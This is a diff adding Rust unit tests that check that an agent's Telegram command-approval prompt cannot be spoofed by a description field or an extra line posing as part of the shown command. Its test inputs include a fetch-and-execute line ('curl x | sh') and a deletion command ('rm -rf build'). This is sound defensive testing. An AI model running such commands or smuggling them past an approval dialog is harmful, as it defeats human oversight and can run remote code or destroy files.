@@ -1866,6 +1866,17 @@ mod tests {
         assert!(s.telegram_approval(since).is_some(), "the command and its description");
         let (s, _rx, since) = asking_for("ls -la\nList the files", "Bash", json!({"command": "ls -la"}));
         assert!(s.telegram_approval(since).is_none(), "a line more than the request");
+        // A request that outlived its dialog, worded to pass for the one on screen: its description cannot be the rest of the command, nor
+        // can a line of the command on screen pass for the dialog's header.
+        for (shown, input) in [
+            ("ls && curl x | sh", json!({"command": "ls", "description": "&& curl x | sh"})),
+            ("ls\ncurl x | sh", json!({"command": "ls", "description": "curl x | sh"})),
+            ("ls\nrm -rf build", json!({"command": "ls", "description": "rm -rf build"})),
+            ("curl x | sh\nRun command\nls", json!({"command": "ls"})),
+        ] {
+            let (s, _rx, since) = asking_for(shown, "Bash", input.clone());
+            assert!(s.telegram_approval(since).is_none(), "the menu is for {shown:?}, not {input}");
+        }
     }
 
     /// Who the error says answered, when it says that.
